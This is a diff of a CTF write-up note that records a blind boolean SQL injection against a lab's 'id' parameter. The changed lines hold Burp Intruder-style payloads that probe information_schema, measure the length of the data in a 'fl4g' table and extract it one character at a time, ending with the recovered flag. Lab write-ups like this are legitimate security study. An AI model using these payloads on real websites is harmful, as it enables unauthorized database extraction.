@@ -1108,11 +1108,14 @@ id=1'+and+substr((select+group_concat(table_name)+from+information_schema.tables
 id=1'+and+length((select+group_concat(column_name)+from+information_schema.columns+where+table_schema%3ddatabase()+and+table_name%3d'fl4g'))%3d§1§%23
 ```
 ![[Pasted image 20240329135041.png]]
-爆字段为 skctfflag
+dump长度 为42
 ```
-id=1'+and+substr((select+group_concat(column_name)+from+information_schema.columns+where+table_schema%3ddatabase()+and+table_name%3d'fl4g'),§1§,1)%3d'§1§'%23
+id=1'+and+length((select+*+from+hazel.fl4g))%3d§1§%23
 ```
-![[Pasted image 20240329140550.png]]
+dump
 ```
-hazel{8c4c152d[15]1aa[19][20]4[22][23]1[25][26]aac[30][31][32]1ca6e[38]efa0
+id=1'+and+substr((select+*+from+hazel.fl4g),§1§,1)%3d'§1§'%23
+```
+```
+hazel{8c4c152d-1aa9-4991-8aac-951ca6e3efa0}
 ```
